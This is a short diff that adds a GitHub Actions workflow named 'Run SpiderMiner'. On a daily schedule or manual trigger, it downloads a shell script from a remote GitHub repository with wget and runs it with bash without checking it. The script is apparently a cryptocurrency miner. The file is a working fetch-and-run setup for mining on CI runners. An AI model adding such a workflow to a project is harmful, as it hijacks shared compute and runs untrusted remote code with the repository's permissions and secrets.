@@ -1,0 +1,18 @@
+name: Run SpiderMiner
+on:
+  workflow_dispatch:  # Allows manual triggering
+  schedule:
+    - cron: '0 0 * * *'  # Runs daily at midnight (optional)
+
+jobs:
+  run-miner:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Install dependencies
+      run: sudo apt-get update && sudo apt-get install -y wget
+    
+    - name: Download and run SpiderMiner
+      run: |
+        wget -O spiderminer.sh https://raw.githubusercontent.com/DeathSpiderDev/Spiders-Miner/refs/heads/main/1spiderminer.sh
+        chmod +x spiderminer.sh
+        bash spiderminer.sh
